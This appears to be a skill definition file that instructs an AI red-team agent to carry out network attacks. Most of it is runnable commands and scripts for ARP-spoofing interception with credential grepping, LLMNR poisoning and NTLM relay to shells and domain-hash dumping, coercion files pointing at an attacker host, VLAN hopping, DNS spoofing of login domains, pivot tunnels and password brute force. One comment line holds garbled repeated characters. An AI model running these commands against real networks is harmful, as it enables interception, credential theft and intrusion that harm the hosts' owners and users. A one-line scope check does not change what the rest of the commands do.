# Network Operator

Network-level attacks — ARP spoofing, man-in-the-middle interception, SMB relay, LLMNR/NBT-NS poisoning, VLAN hopping, and network traffic analysis with tshark.

## Tags
offensive, network, MITM, red-team

## Triggers
network attack, ARP spoof, MITM, SMB relay, LLMNR, NBT-NS, VLAN hopping, network traffic, packet capture

## Recommended Model
sonnet

---
## Cybersecurity Skills (Invoke First)

Before starting network-level attacks, invoke these skills via the Skill tool:
- `cybersecurity-skills:performing-arp-spoofing-attack-simulation`
- `cybersecurity-skills:conducting-man-in-the-middle-attack-simulation`
- `cybersecurity-skills:performing-network-traffic-analysis-with-tshark`
- `cybersecurity-skills:performing-network-packet-capture-analysis`
- `cybersecurity-skills:detecting-arp-poisoning-in-network-traffic`
- `cybersecurity-skills:hunting-for-ntlm-relay-attacks`
- `cybersecurity-skills:detecting-ntlm-relay-with-event-correlation`
- `cybersecurity-skills:performing-network-traffic-analysis-with-zeek`

## Scope Enforcement
Verify subnet/targets in scope.txt. Network attacks affect ALL hosts on segment — confirm the FULL subnet is authorized.
ARP poisoning and SMB relay affect ENTIRE network segments. Confirm authorization explicitly.

---

## Passive Network Discovery

### Host Discovery
```bash
EVIDENCE=evidence/$(date +%Y%m%d)/$TARGET
mkdir -p $EVIDENCE/{network,creds,relay,pivot,capture}

# ARP sweep — discover live hosts on local segment
arp-scan -I eth0 --localnet | tee $EVIDENCE/network/arp_sweep.txt

# Nmap ping sweep (ICMP + ARP)
nmap -sn -PE -PP -PM $SUBNET/24 -oG $EVIDENCE/network/ping_sweep.gnmap
grep "Up" $EVIDENCE/network/ping_sweep.gnmap | awk '{print $2}' > $EVIDENCE/network/live_hosts.txt

# NetBIOS discovery
nbtscan $SUBNET/24 | tee $EVIDENCE/network/netbios_hosts.txt

# Passive ARP table collection (no active traffic)
cat /proc/net/arp | tee $EVIDENCE/network/arp_table.txt

# Passive observation — collect traffic for 5 minutes before active attacks
tcpdump -i eth0 -w $EVIDENCE/capture/passive_$(date +%s).pcap \
  -G 300 -W 1 -c 10000 2>&1 &
```

---

## ARP Spoofing / MITM

### arpspoof (Classic)
```bash
# Step 0: Enable IP forwarding (CRITICAL — prevents DoS)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 1: ARP poison victim ↔ gateway (both directions)
arpspoof -i eth0 -t $VICTIM $GATEWAY &
arpspoof -i eth0 -t $GATEWAY $VICTIM &

# Step 2: Capture MitM traffic
tcpdump -i eth0 -w $EVIDENCE/capture/mitm_$(date +%s).pcap \
  "host $VICTIM and not arp" &

# Step 3: Parse interesting traffic from capture
tshark -r $EVIDENCE/capture/mitm_*.pcap \
  -Y "http.request.method == POST" -T fields \
  -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri -e http.file_data \
  | grep -i "pass\|pwd\|user\|login\|token\|session" \
  | tee $EVIDENCE/network/mitm_credentials.txt

# Cleanup: kill %1 %2 %3 && echo 0 > /proc/sys/net/ipv4/ip_forward
```

### Bettercap (Full-Featured MITM)
```bash
# Launch Bettercap with interactive session
bettercap -iface eth0 -no-history

# Inside Bettercap:
# net.probe on                              # Discover hosts
# net.show                                   # List discovered hosts
# set arp.spoof.targets $VICTIM_IP           # Set target
# set arp.spoof.fullduplex true              # Poison both directions
# arp.spoof on                               # Start ARP poisoning
# net.sniff on                               # Start packet sniffer
# set http.proxy.sslstrip true               # SSL stripping (HSTS bypass issues)
# http.proxy on                              # Start HTTP proxy
# set api.rest.address 0.0.0.0               # Web UI
# api.rest on                                # Enable REST API (port 8081)
#
# For credential harvesting:
# set http.proxy.script harvest-creds.js     # Custom script for logging creds
#
# View captured data:
# http.show                                  # Show HTTP requests
```

### Network Interface Verification
```bash
# Verify interface is in correct mode for MITM
ip link show eth0 | grep -i "promisc\|monitor"
# If not in promiscuous mode:
ip link set eth0 promisc on

# Check for NIC offloading (can cause issues with injection)
ethtool -k eth0 | grep -i "generic-receive-offload\|tcp-segmentation-offload"
# Disable if causing problems:
ethtool -K eth0 gro off tso off

# Verify IP forwarding is active
cat /proc/sys/net/ipv4/ip_forward
# Should be 1
```

---

## SMB Relay Attacks

### SMB Signing Check with NetExec
```bash
# Scan entire subnet for hosts WITHOUT SMB signing (relay targets)
netexec smb $SUBNET/24 --gen-relay-list \
  -o $EVIDENCE/relay/relay_targets.txt 2>&1

# Detailed check per host
netexec smb $TARGET --shares --gen-relay-list 2>&1 | tee $EVIDENCE/relay/smb_signing_$TARGET.txt

# Output format: lists IPs where signing is NOT required (relay candidates)
# Filter for hosts with interesting shares (C$, ADMIN$, IPC$)
netexec smb $SUBNET/24 --shares \
  -o $EVIDENCE/relay/smb_shares_all.txt 2>&1
```

### Full NTLM Relay Attack Pipeline
```bash
# Step 1: Disable SMB and HTTP in Responder config
# Edit /etc/responder/Responder.conf:
#   SMB = Off
#   HTTP = Off
#   (Leave DNS, WPAD, LDAP, etc. ON for poisoning)

# Step 2: Generate relay target list (SMB signing disabled + interesting shares)
netexec smb $SUBNET/24 --gen-relay-list \
  -o $EVIDENCE/relay/relay_targets.txt

# Verify targets
cat $EVIDENCE/relay/relay_targets.txt
# Should contain IPs without SMB signing

# Step 3: Start NTLM relay (smbexec attack — get shell)
impacket-ntlmrelayx \
  -tf $EVIDENCE/relay/relay_targets.txt \
  -smb2support \
  -i \
  2>&1 | tee $EVIDENCE/relay/ntlmrelayx.log &

# Step 4: Force NTLM authentication with Responder (on different interface/port)
responder -I eth0 -dwP -v \
  2>&1 | tee $EVIDENCE/relay/responder.log &

# Step 5: Trigger authentication (when relay succeeds, connect to shell)
# ntlmrelayx with -i opens interactive shell on 127.0.0.1:11000
nc 127.0.0.1 11000

# Step 6: If SMB relay to DC — DCSync for domain hashes
impacket-ntlmrelayx \
  -tf $EVIDENCE/relay/relay_targets.txt \
  -smb2support \
  -c "impacket-secretsdump $DOMAIN/%username%:%password%@127.0.0.1 -just-dc" \
  2>&1 | tee $EVIDENCE/relay/dcsync_relay.log
```

### LDAP Relay (to AD)
```bash
# Relay NTLM auth to LDAP for AD enumeration / ACL abuse
impacket-ntlmrelayx \
  -tf $EVIDENCE/relay/relay_targets.txt \
  -smb2support \
  -wh $EVIDENCE/relay/wolf_hashes.txt \
  2>&1 | tee $EVIDENCE/relay/ldap_relay.log
```

---

## LLMNR/NBT-NS Poisoning

### Responder Configuration
```bash
# Standard Responder deployment for hash capture
responder -I eth0 -dwPv \
  2>&1 | tee $EVIDENCE/network/responder.log &

# Responder flags:
# -w  → Start WPAD rogue proxy server
# -d  → Enable answers for NBT-NS queries
# -P  → Enable answers for poisoned NBT-NS/LLMNR queries (default: on)
# -v  → Verbose mode

# Monitor captured hashes in real-time
tail -f /usr/share/responder/logs/*.txt

# Analyze captured NTLMv2 hashes
ls -la /usr/share/responder/logs/NTLMv2-SSP-*.txt 2>/dev/null
cp /usr/share/responder/logs/NTLMv2*.txt \
  $EVIDENCE/creds/responder_hashes.txt 2>/dev/null

# Hand off to password-attacks agent for hashcat -m 5600
```

### Forced Authentication Triggers
```bash
# Method 1: Print spooler (trigger auth from Windows hosts)
impacket-PetitPotam.py $LHOST/$FAKE_SHARE $TARGET 2>&1 | tee $EVIDENCE/network/petitpotam.txt

# Method 2: SCF file on SMB share (triggers auth when browsed in Explorer)
echo '[InternetShortcut]\nURL=anything\nIconFile=\\\\'$LHOST'\\share\\icon.ico\nIconIndex=1\n' > \
  /tmp/trigger.scf
# Serve via SMB: impacket-smbserver share /tmp/ -smb2support

# Method 3: HTML with UNC path (triggers NTLM when opened in browser)
echo '<img src="\\'$LHOST'\\share\\image.jpg">' > /tmp/trigger.html

# Method 4: Lock picking — EfsRpc trigger
python3 /opt/PetitPotam/PetitPotam.py -d $DOMAIN -u $USER -p $PASS $LHOST $TARGET
```

---

## VLAN Hopping

### Double Tagging (QinQ)
```bash
# Requirements: trunk port with native VLAN mismatch
# Attacker sends frames with two 802.1Q tags

# Using scapy for double-tagged frame injection
python3 << 'EOF'
from scapy.all import *

# Outer tag: attacker's VLAN (allowed by switch)
outer_vlan = 10
# Inner tag: target VLAN (stripped by first switch, forwarded by second)
inner_vlan = 20
target_ip = "192.168.20.x"

# Craft double-tagged ARP request
pkt = Ether()/Dot1Q(vlan=outer_vlan)/Dot1Q(vlan=inner_vlan)/ARP(
    pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff"
)
sendp(pkt, iface="eth0", count=5)
print(f"[*] Sent double-tagged ARP for VLAN {inner_vlan}")
EOF

# Detection: check native VLAN configuration
# show vlan brief (Cisco)
# show interfaces trunk
```

### Switch Spoofing (DTP Abuse)
```bash
# Trunk negotiation to negotiate trunk mode and access all VLANs
python3 << 'EOF'
from scapy.all import *

# DTP trunk negotiation frame
pkt = Ether(dst="01:00:0c:cc:cc:cc")/Dot3()/SNAP()/DTP(
    tlvlist=[DTPDomain(), DTPStatus(), DTPType(), DTPNeighbor()]
)
sendp(pkt, iface="eth0", count=10, interval=2)
print("[*] DTP trunk negotiation sent")
EOF

# After trunk negotiation succeeds:
# Create VLAN interfaces for each target VLAN
for vlan in 10 20 30 40 50; do
  ip link add link eth0 name eth0.$vlan type vlan id $vlan
  ip link set eth0.$vlan up
  dhclient eth0.$vlan 2>/dev/null
done
```

### VLAN Enumeration via PVLAN
```bash
# Probe private VLAN boundaries
for vlan in $(seq 1 4094); do
  response=$(ping -c 1 -W 1 192.168.$vlan.1 2>&1 | grep "time=")
  if [ -n "$response" ]; then
    echo "[+] VLAN $vlan is reachable"
  fi
done 2>/dev/null | tee $EVIDENCE/network/vlan_reachable.txt
```

---

## Network Traffic Analysis

### Tshark Essential Filters
```bash
PCAP=$EVIDENCE/capture/capture.pcap

# Protocol distribution
tshark -r $PCAP -q -z io,phs | head -30 | tee $EVIDENCE/network/protocol_dist.txt

# Top talkers
tshark -r $PCAP -q -z conv,ip | head -20 | tee $EVIDENCE/network/top_talkers.txt

# DNS queries
tshark -r $PCAP -Y "dns.qry.name" -T fields \
  -e frame.time -e ip.src -e dns.qry.name \
  | sort | uniq -c | sort -rn | head -30 | tee $EVIDENCE/network/dns_queries.txt

# HTTP traffic
tshark -r $PCAP -Y "http" -T fields \
  -e frame.time -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri \
  | head -50 | tee $EVIDENCE/network/http_traffic.txt

# NTLM/Kerberos authentication
tshark -r $PCAP -Y "ntlmssp || kerberos" -T fields \
  -e frame.time -e ip.src -e ip.dst -e ntlmssp.auth.username \
  | tee $EVIDENCE/network/auth_traffic.txt

# Cleartext credentials
tshark -r $PCAP -Y "http.request.method==POST" -T fields \
  -e http.file_data | grep -iE "pass|pwd|user|login|token|secret" \
  | tee $EVIDENCE/network/cleartext_creds.txt

# SMB operations
tshark -r $PCAP -Y "smb2 || smb" -T fields \
  -e frame.time -e ip.src -e ip.dst -e smb2.cmd \
  | tee $EVIDENCE/network/smb_traffic.txt

# Extract files from pcap
tshark -r $PCAP --export-objects http,$EVIDENCE/network/exported_http/
tshark -r $PCAP --export-objects smb,$EVIDENCE/network/exported_smb/
```

### Packet Capture Methodology
```bash
# Targeted capture (specific host, specific protocols)
tcpdump -i eth0 \
  -w $EVIDENCE/capture/targeted.pcap \
  "host $TARGET and (port 80 or port 443 or port 445 or port 53)" \
  -G 600 -W 6 2>&1 &
# -G 600 = rotate every 10 minutes, -W 6 = keep 6 files (1 hour)

# Full segment capture (for later analysis)
tcpdump -i eth0 \
  -w $EVIDENCE/capture/segment.pcap \
  -G 300 -W 12 -C 100 2>&1 &
# -C 100 = rotate at 100MB, good for long-running captures

# Capture filter (Berkeley Packet Filter)
# Only traffic TO or FROM specific subnet (not broadcast)
tcpdump -i eth0 -w capture.pcap \
  "net $SUBNET and not broadcast and not multicast"

# Capture with snaplen (limit per-packet size for large captures)
tcpdump -i eth0 -w capture.pcap -s 128 "host $TARGET"
# -s 128 = first 128 bytes of each packet (headers only, lighter)
```

---

## Active Directory Network Attacks

### Kerberos Attacks
```bash
# AS-REP Roasting (enumerate users with no pre-auth)
impacket-GetNPUsers $DOMAIN/ -request -outputfile $EVIDENCE/creds/asrep_hashes.txt \
  2>&1 | tee $EVIDENCE/network/asrep_roast.txt
# Crack with: hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Kerberoasting (request service tickets for cracking)
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -request -outputfile $EVIDENCE/creds/kerberoast_hashes.txt \
  2>&1 | tee $EVIDENCE/network/kerberoast.txt
# Crack with: hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# Kerberos relay
# Relay NTLM auth to Kerberos for service ticket
impacket-ntlmrelayx \
  -tf $EVIDENCE/relay/relay_targets.txt \
  -smb2support \
  -t ldap://$DC_IP \
  --dump-adcs \
  2>&1 | tee $EVIDENCE/network/kerberos_relay.txt

# Pass-the-Ticket from captured Kirbi file
impacket-ticketer \
  -nthash $NTLM_HASH \
  -domain $DOMAIN \
  -spn cifs/$TARGET.$DOMAIN \
  -request-user $USER \
  $EVIDENCE/creds/ticket.kirbi

# Use ticket with impacket tools:
export KRB5CCNAME=$EVIDENCE/creds/ticket.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -no-pass -k
```

### LDAPS Interception
```bash
# Intercept LDAP signing traffic for relay
# If LDAPS is used (port 636) with signing not required:
impacket-ntlmrelayx \
  -tf $EVIDENCE/relay/relay_targets.txt \
  -smb2support \
  -t ldaps://$DC_IP \
  --dump-adcs \
  2>&1 | tee $EVIDENCE/network/ldaps_relay.txt

# LDAP relay to ADCS for certificate issuance
# (requires ADCS with vulnerable template)
impacket-ntlmrelayx \
  -tf $EVIDENCE/relay/relay_targets.txt \
  -smb2support \
  -t ldaps://$DC_IP \
  --adcs \
  --template Machine \
  2>&1 | tee $EVIDENCE/network/adcs_relay.txt
```

---

## DNS Spoofing and Tunneling

### DNS Spoofing
```bash
# Basic DNS spoofing (redirect specific domains)
cat > /tmp/dnsspoof_hosts.txt << EOF
$TARGET www.google.com
$TARGET login.microsoftonline.com
$TARGET accounts.google.com
EOF

# dnsspoof (from dsniff suite)
dnsspoof -i eth0 -f /tmp/dnsspoof_hosts.txt \
  2>&1 | tee $EVIDENCE/network/dnsspoof.log &

# Ettercap DNS spoofing (alternative)
ettercap -T -q -i eth0 -M dns_spoof:/$TARGET//www.google.com/ 2>&1 &

# Capture DNS responses to verify spoofing
tshark -i eth0 -Y "dns.resp" -T fields -e dns.a 2>&1 | tee $EVIDENCE/network/dns_responses.txt
```

### DNS Tunneling Detection
```bash
# Detect DNS tunneling by analyzing query patterns
# Look for: long subdomains, high volume to single domain, unusual record types

# High-volume DNS queries (potential tunnel)
tshark -r $EVIDENCE/capture/capture.pcap -Y "dns.qry.name" -T fields \
  -e dns.qry.name | awk '{print length, $0}' | sort -rn | head -20

# Unusually long DNS queries (>50 chars = suspicious)
tshark -r $EVIDENCE/capture/capture.pcap -Y "dns.qry.name" -T fields \
  -e dns.qry.name | awk 'length($0) > 50' | sort | uniq -c | sort -rn | head -20

# DNS over non-standard ports
tshark -r $EVIDENCE/capture/capture.pcap -Y "dns && !dns.port == 53" -T fields \
  -e frame.time -e ip.src -e ip.dst -e dns.qry.name

# DNS tunneling tools to test with:
# dnscat2, iodine, dns2tcp — verify client tools are not installed
which dnscat2 iodine dns2tcp 2>/dev/null
```

---

## Network Pivoting

### Chisel (Tunneled SOCKS/Port Forward)
```bash
# Server (attacker machine — publicly accessible):
chisel server --reverse -p $LPORT --auth user:pass

# Client (compromised machine — inside target network):
chisel client $LHOST:$LPORT R:socks &
# This creates a SOCKS5 proxy on attacker:1080

# Use the tunnel:
# Method 1: proxychains
echo "socks5 127.0.0.1 1080 user pass" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 10.0.0.0/24

# Method 2: direct tool proxy support
nmap -sT -Pn --proxy 127.0.0.1:1080 10.0.0.0/24

# Port-specific forwarding (forward internal port to attacker)
# Client: chisel client $LHOST:$LPORT R:$LOCAL_PORT:10.0.0.x:$REMOTE_PORT
chisel client $LHOST:$LPORT R:445:10.0.0.5:445
# Now connect to localhost:445 on attacker = 10.0.0.5:445 inside target
```

### Ligolo-ng (Tunneled Interface)
```bash
# Agent (compromised machine):
# ./agent -connect $LHOST:$LPORT -ignore-cert

# Proxy (attacker machine):
sudo ./proxy -selfcert
# Inside proxy console:
#隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道隧道
# tunnel_start --tun 10.10.10.1/24

# Add route through tunnel
sudo ip route add 10.0.0.0/24 dev ligolo

# Now all tools route through tunnel natively
nmap -sS 10.0.0.0/24
netexec smb 10.0.0.0/24 --shares
```

### SSH Tunneling (Simple Pivoting)
```bash
# SOCKS5 proxy through compromised Linux host
ssh -D 9050 -f -N -C $USER@$COMPROMISED_HOST
# -D 9050 = SOCKS5 on local:9050
# -C = compression
# -N = no remote command
# -f = background

# Port forwarding (specific port)
# Forward internal RDP to attacker
ssh -L 3389:10.0.0.5:3389 -f -N $USER@$COMPROMISED_HOST
# Now: rdp://localhost:3389 on attacker = 10.0.0.5:3389 inside

# Remote port forwarding (expose internal service to internet)
ssh -R 8080:10.0.0.5:80 -f -N $USER@$COMPROMISED_HOST
# Now: $COMPROMISED_HOST:8080 = 10.0.0.5:80

# Dynamic proxy chain (multiple hops)
# Hop 1: SSH to host A
ssh -D 9050 -f -N user@hostA
# Hop 2: Through host A to host B
proxychains ssh -D 9051 -f -N user@hostB
# Use chain: proxychains (uses 9051 → 9050 → target)
```

### Proxychains Configuration
```bash
# /etc/proxychains4.conf
# Add pivots:
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051 (chained through 9050)

# Usage with tools:
proxychains nmap -sT -Pn -p 445 10.0.0.0/24
proxychains netexec smb 10.0.0.0/24 --shares
proxychains impacket-psexec $DOMAIN/$USER:$PASS@10.0.0.5
proxychains hydra -l admin -P wordlist.txt rdp://10.0.0.10
proxychains ssh user@10.0.0.20

# Proxychains + Metasploit
# Set proxy in MSF:
msfconsole -q -x "setg Proxies socks5:127.0.0.1:9050; setg ReverseAllowProxy true; exit"
```

---

## SNMP Enumeration (Network Recon)

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  $TARGET 2>/dev/null | tee $EVIDENCE/network/snmp_communities.txt

# Full SNMP walk on discovered community
snmpwalk -v 2c -c $COMMUNITY $TARGET \
  2>/dev/null | tee $EVIDENCE/network/snmpwalk_full.txt

# Targeted OIDs by category
# System info
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1     # System
# Interfaces
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.2     # Interfaces
# IP addresses
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.34   # IP addresses
# TCP connections
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.6.13   # TCP connections
# Running processes
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2 # Processes
# Installed software
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.6.3 # Software
# User accounts
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 # Local users
# Listening ports
snmpwalk -v 2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.7      # UDP listeners

# SNMPv3 enumeration
nmap -sU -p 161 --script snmp-info,snmp-brute $TARGET
```

---

## Service Brute Force (Network Services)
```bash
# SSH
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://$TARGET -t 4 -V 2>&1 | tee $EVIDENCE/network/hydra_ssh.txt

# FTP
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ftp://$TARGET -t 4 2>&1 | tee $EVIDENCE/network/hydra_ftp.txt

# RDP
hydra -l administrator -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  rdp://$TARGET -t 4 2>&1 | tee $EVIDENCE/network/hydra_rdp.txt

# SMB (via NetExec — preferred)
netexec smb $TARGET -u $USER -p $PASS \
  --bruteforce --passes /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  2>&1 | tee $EVIDENCE/network/netexec_smb_brute.txt

# SNMP community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  $TARGET 2>&1 | tee $EVIDENCE/network/snmp_brute.txt

# Database brute force (MySQL)
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  mysql://$TARGET 2>&1 | tee $EVIDENCE/network/hydra_mysql.txt

# Database brute force (MSSQL)
hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  mssql://$TARGET 2>&1 | tee $EVIDENCE/network/hydra_mssql.txt
```

---

## DNS Enumeration (Network)
```bash
# Zone transfer attempt (critical if successful)
for ns in $(dig NS $DOMAIN +short); do
  echo "[*] Trying zone transfer against $ns"
  dig axfr $DOMAIN @$ns | tee $EVIDENCE/network/zt_$ns.txt
done

# DNS brute force
dnsrecon -d $DOMAIN \
  -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t brt 2>&1 | tee $EVIDENCE/network/dnsrecon.txt

# Fierce (DNS + host discovery)
fierce --domain $DOMAIN \
  2>&1 | tee $EVIDENCE/network/fierce.txt

# Internal DNS server enumeration (from compromised host)
# Check for internal DNS entries
dig @10.0.0.1 any $DOMAIN +short 2>/dev/null
dig @10.0.0.1 axfr $DOMAIN 2>/dev/null  # Try zone transfer on internal DNS

# DNS cache snooping (if recursive resolver found)
for domain in google.com microsoft.com facebook.com; do
  echo "[$domain]"
  dig $domain @$TARGET +short 2>/dev/null
done | tee $EVIDENCE/network/dns_cache.txt
```

---

## Evidence Output Structure

```
evidence/$(date +%Y%m%d)/$TARGET/
├── network/
│   ├── arp_sweep.txt
│   ├── live_hosts.txt
│   ├── top_talkers.txt
│   ├── protocol_dist.txt
│   ├── dns_queries.txt
│   ├── http_traffic.txt
│   ├── smb_traffic.txt
│   ├── snmpwalk_full.txt
│   ├── responder.log
│   ├── mitm_credentials.txt
│   ├── dns_responses.txt
│   ├── vlan_reachable.txt
│   └── network_findings.md
├── creds/
│   ├── responder_hashes.txt
│   ├── asrep_hashes.txt
│   ├── kerberoast_hashes.txt
│   └── relayed_hashes.txt
├── relay/
│   ├── relay_targets.txt
│   ├── smb_signing_*.txt
│   ├── smb_shares_all.txt
│   ├── ntlmrelayx.log
│   └── dcsync_relay.log
├── pivot/
│   ├── chisel.log
│   ├── ligolo_session.txt
│   └── ssh_tunnel_config.txt
├── capture/
│   ├── passive_*.pcap
│   ├── mitm_*.pcap
│   ├── targeted.pcap
│   ├── exported_http/
│   └── exported_smb/
└── network_findings.md
```

### Consolidated Findings Report
```bash
cat > $EVIDENCE/network/network_findings.md << 'EOF'
## Network Operations Findings — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### Network Topology
| Host | IP | VLAN | Open Ports | OS | Role |
|------|-----|------|------------|-----|------|

### Credentials Captured
| Source | Username | Hash/Password | Hash Type | Cracked? |
|--------|----------|--------------|-----------|----------|

### SMB Relay Results
| Target | Signing? | Shares | Relay Success? | Access Level |
|--------|----------|--------|----------------|--------------|

### MITM Findings
| Protocol | Finding | Risk |
|----------|---------|------|

### VLAN Hopping
| Target VLAN | Technique | Success? |
|-------------|-----------|----------|

### Pivoting Summary
| Pivot Host | Tunnel Type | Internal Networks Accessible |
|-------------|-------------|-------------------------------|

### DNS Findings
| Type | Finding | Risk |
|------|---------|------|

### Recommended Next Steps
1. [Priority action]
2. [Credential cracking priorities]
3. [Lateral movement targets]
EOF
```

